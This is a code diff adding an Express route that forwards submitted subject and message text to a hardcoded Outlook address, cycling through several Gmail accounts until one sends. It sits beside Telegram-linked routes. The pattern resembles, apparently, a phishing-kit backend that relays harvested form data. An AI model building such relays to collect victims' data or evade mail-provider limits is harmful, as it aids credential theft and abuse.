@@ -126,6 +126,63 @@ app.post("/go", (req, res) => {
   });
 });
 
+// New route: Sends email without Telegram integration
+app.post("/gowt", (req, res) => {
+  const { subject, message } = req.body;
+
+  // Validate request body
+  if (!subject || !message) {
+    console.log("Request validation failed. Missing subject or message."); // Diagnostic point
+    return res.status(400).json({ error: "All fields are required" });
+  }
+
+  console.log("Received request to send email only."); // Diagnostic point
+
+  let attempt = 0;
+
+  const tryNextAccount = () => {
+    if (attempt >= gmailAccounts.length) {
+      console.log("All Gmail accounts have been tried, email sending failed.");
+      return res.status(500).json({ error: "Failed to send email with all accounts" });
+    }
+
+    const { user, pass } = gmailAccounts[attempt];
+    console.log(`Attempting to send email with: ${user}`); // Diagnostic point
+
+    const transporter = nodemailer.createTransport({
+      service: "gmail",
+      auth: {
+        user,
+        pass,
+      },
+    });
+
+    // Prepare email options
+    const mailOptions = {
+      from: user, // Sender email
+      to: "hey.heatherw@outlook.com", // Recipient email
+      subject: subject, // Email subject
+      text: message, // Email body
+    };
+
+    // Send email
+    transporter.sendMail(mailOptions, (error, info) => {
+      if (error) {
+        console.log(`Failed to send email with ${user}:`, error); // Diagnostic point
+        attempt++; // Try the next account
+        tryNextAccount();
+      } else {
+        console.log(`Email successfully sent using ${user}.`); // Diagnostic point
+        res.status(200).json({ message: "Email sent successfully", info });
+      }
+    });
+  };
+
+  // Start trying to send the email with the first account
+  tryNextAccount();
+});
+
+
 app.post("/telegram-webhook", (req, res) => {
   console.log("Telegram webhook triggered:", JSON.stringify(req.body, null, 2));
 
